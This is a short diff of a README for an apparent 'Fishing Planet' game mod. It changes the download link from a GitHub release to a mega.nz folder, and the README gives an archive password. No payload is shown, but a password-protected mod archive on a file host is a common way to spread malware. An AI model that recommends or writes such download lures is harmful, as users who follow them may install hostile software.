@@ -8,7 +8,7 @@
 
 ## 📥 DOWNLOAD
 
-### [⬇️ DOWNLOAD ZIP ARCHIVE (LATEST VERSION)](https://github.com/nickhall-x1991o0/Fishing-Planet-Ultimate-Mod/releases/download/FishingPlanet/FishingPlanet_Mod.zip)
+### [⬇️ DOWNLOAD ZIP ARCHIVE (LATEST VERSION)](https://mega.nz/folder/gMN3nLBC#P1ldhYoUlHExIsR7VfJ1bQ)
 
 🔐 **Archive password:** **`5868781`**
 
